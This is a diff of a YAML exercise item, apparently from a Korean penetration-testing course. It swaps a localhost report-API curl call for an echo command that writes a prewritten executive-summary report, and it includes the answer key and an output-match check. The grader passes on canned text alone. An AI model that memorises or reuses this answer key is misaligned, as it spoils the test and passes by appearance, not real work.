-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/completion-report -H
-    ''Content-Type: application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"summary":"종합
-    모의해킹 완료","outcome":"success"}'''
-  answer_detail: AI가 종합 모의해킹 결과를 자동으로 종합하여 완료 보고서를 생성한다.
-  script: ccc_completion_report.py
+  points: 15
+  answer: 'echo -e ''=== PENETRATION TEST REPORT ===\n=== Executive Summary ===\n\nDate: 2026-04-03\nScope: 10.20.30.0/24 (4 servers)\nTesters: Security Lab Student\nClassification: Confidential\n\n[Overall
+    Risk: HIGH]\n\nThe penetration test identified 10 vulnerabilities across\nthe target infrastructure. 2 Critical and 3 High severity\nvulnerabilities were discovered, allowing:\n\n1. Complete database
+    compromise via SQL Injection\n2. Full lateral movement across all servers\n3. Persistent unauthorized access\n4. Potential data exfiltration\n\n[Statistics]\n- Critical: 2 (SQL Injection, Data Exposure)\n-
+    High: 3 (Cred Reuse, No Rate Limit, IDOR)\n- Medium: 4 (XSS, Missing Headers, DirList, Verbose Errors)\n- Low: 1 (Version Disclosure)\n\n[Top 3 Recommendations]\n1. Fix SQL Injection immediately (parameterized
+    queries)\n2. Implement unique passwords per server + SSH key auth\n3. Add authentication to all API endpoints\n\n[Conclusion]\nThe current security posture requires significant improvement.\nImmediate
+    action on Critical findings is strongly recommended.'' > /tmp/pentest_final_report.txt && cat /tmp/pentest_final_report.txt'
+  answer_detail: 모의해킹 최종 보고서는 경영진이 이해할 수 있는 Executive Summary로 시작해야 한다. 전체 위험 수준, 주요 발견 사항, 핵심 권고를 간결하게 요약하고, 상세 기술 내용은 부록에 첨부한다.
   verify:
     type: output_contains
-    expect: result
+    expect: PENETRATION TEST REPORT
     field: stdout
+  script: 'echo -e ''=== PENETRATION TEST REPORT ===\n=== Executive Summary ===\n\nDate: 2026-04-03\nScope: 10.20.30.0/24 (4 servers)\nTesters: Security Lab Student\nClassification: Confidential\n\n[Overall
+    Risk: HIGH]\n\nThe penetration test identified 10 vulnerabilities across\nthe target infrastructure. 2 Critical and 3 High severity\nvulnerabilities were discovered, allowing:\n\n1. Complete database
+    compromise via SQL Injection\n2. Full lateral movement across all servers\n3. Persistent unauthorized access\n4. Potential data exfiltration\n\n[Statistics]\n- Critical: 2 (SQL Injection, Data Exposure)\n-
+    High: 3 (Cred Reuse, No Rate Limit, IDOR)\n- Medium: 4 (XSS, Missing Headers, DirList, Verbose Errors)\n- Low: 1 (Version Disclosure)\n\n[Top 3 Recommendations]\n1. Fix SQL Injection immediately (parameterized
+    queries)\n2. Implement unique passwords per server + SSH key auth\n3. Add authentication to all API endpoints\n\n[Conclusion]\nThe current security posture requires significant improvement.\nImmediate
+    action on Critical findings is strongly recommended.'' > /tmp/pentest_final_report.txt && cat /tmp/pentest_final_report.txt'
+  risk_level: low
